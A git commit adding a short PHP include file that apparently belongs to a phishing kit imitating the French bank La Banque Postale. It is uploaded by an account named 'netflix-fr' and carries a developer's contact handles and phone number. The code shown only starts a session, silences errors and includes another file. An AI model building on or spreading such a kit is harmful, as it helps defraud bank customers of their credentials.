252a2eb0298874d9bc55cba78bcea349fda74e26
netflix-fr <112420230+netflix-fr@users.noreply.github.com>
2022-08-30 17:46:39 +0200

    Add files via upload

---
+++ banque postal/inc/app.php
@@ -0,0 +1,20 @@
+<?php
+
+/**
+ * @link              https://www.z0n51.com/
+ * @since             13/05/2020
+ * @package           LA BANQUE POSTALE
+ * @facebook          https://www.facebook.com/z0n51
+ * @whatsapp          +212601728021
+ * @icq               @z0n51
+ * @telegram          @z0n51
+ *
+ * Project Name:      LA BANQUE POSTALE
+ * Author:            z0n51
+ * Author URI:        https://www.facebook.com/z0n51
+ */
+
+session_start();
+error_reporting(0);
+include_once 'functions.php';
+?>
